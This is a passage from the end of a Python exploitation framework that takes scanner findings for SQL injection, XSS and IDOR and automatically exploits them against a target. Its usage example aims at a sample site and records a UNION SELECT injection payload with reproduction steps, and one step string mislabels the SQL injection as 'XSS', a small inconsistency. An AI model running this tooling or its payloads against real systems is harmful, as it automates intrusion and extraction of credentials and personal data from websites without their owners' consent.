            return {"error": "No findings provided"}
        
        # Load and validate findings
        findings = self.load_findings(findings_data)
        if not findings:
            return {"error": "No valid findings to exploit"}
        
        # Initialize with first target
        first_target = findings[0].target
        base_url = '/'.join(first_target.split('/')[:3])  # Extract scheme://domain
        self.engine.initialize(base_url)
        
        # Exploit each finding
        print(f"Starting exploitation of {len(findings)} findings...")
        
        for i, finding in enumerate(findings, 1):
            print(f"\n[{i}/{len(findings)}] Exploiting {finding.vulnerability_type.value} "
                  f"at {finding.endpoint}?{finding.parameter}={finding.value}")
            
            result = self.engine.exploit_finding(finding)
            
            if result.status == ExploitationStatus.VERIFIED:
                print(f"  ✓ VERIFIED: {result.impact[:100]}...")
            elif result.status == ExploitationStatus.FAILED:
                print(f"  ✗ FAILED: {result.exploitation_steps[-1] if result.exploitation_steps else 'No success'}")
            else:
                print(f"  ? INCONCLUSIVE: Could not verify exploitation")
        
        # Generate final report
        report = self.engine.generate_report()
        
        print(f"\n{'='*60}")
        print(f"EXPLOITATION COMPLETE")
        print(f"{'='*60}")
        print(f"Verified exploits: {report['summary']['verified_exploits']}")
        print(f"Failed attempts: {report['summary']['failed_exploits']}")
        print(f"Total payloads attempted: {report['exploitation_statistics']['unique_payloads_attempted']}")
        
        return report


# ==================== USAGE EXAMPLE ====================

def example_usage():
    """Example of how to use the framework."""
    
    # Example scanner findings (simulated input)
    scanner_findings = [
        {
            "target": "https://vulnerable-app.com",
            "endpoint": "/product.php",
            "method": "GET",
            "parameter": "id",
            "value": "1",
            "vulnerability_type": "SQL_INJECTION",
            "scanner_evidence": {
                "response_diff": True,
                "error_detected": True,
                "confidence": 0.85
            }
        },
        {
            "target": "https://vulnerable-app.com",
            "endpoint": "/search",
            "method": "GET",
            "parameter": "q",
            "value": "test",
            "vulnerability_type": "XSS",
            "scanner_evidence": {
                "response_diff": True,
                "error_detected": False,
                "confidence": 0.72
            }
        },
        {
            "target": "https://vulnerable-app.com",
            "endpoint": "/api/user",
            "method": "GET",
            "parameter": "user_id",
            "value": "123",
            "vulnerability_type": "IDOR",
            "scanner_evidence": {
                "response_diff": False,
                "error_detected": False,
                "confidence": 0.65
            }
        }
    ]
    
    # Initialize and run framework
    framework = PostScanningExploitationFramework()
    
    # Run exploitation
    report = framework.run_exploitation(scanner_findings)
    
    # Save report
    with open('exploitation_report.json', 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    print("\nReport saved to exploitation_report.json")
    
    # Example verified finding from report:
    example_verified = {
        "vulnerability_type": "SQL_INJECTION",
        "endpoint": "/product.php",
        "parameter": "id",
        "impact": "Full database read access. Can extract sensitive data including user credentials, PII, and business information.",
        "verification": {
            "primary_signal": "UNION query executed successfully",
            "secondary_signal": "Additional data reflected in response",
            "reproducible": True
        },
        "exploitation_steps": [
            "Starting SQL injection exploitation",
            "Parameter type: numeric_id",
            "Attempting column count detection",
            "Detected 3 columns",
            "Attempting UNION-based extraction",
            "Successful XSS with payload: ' UNION SELECT NULL,NULL,NULL--"
        ],
        "reproduction_guidance": "Send payload: ' UNION SELECT NULL,NULL,NULL--\nObserve database data in response\nVerify with alternative payloads"
    }
    
    return report


if __name__ == "__main__":
    # Run example
    example_usage()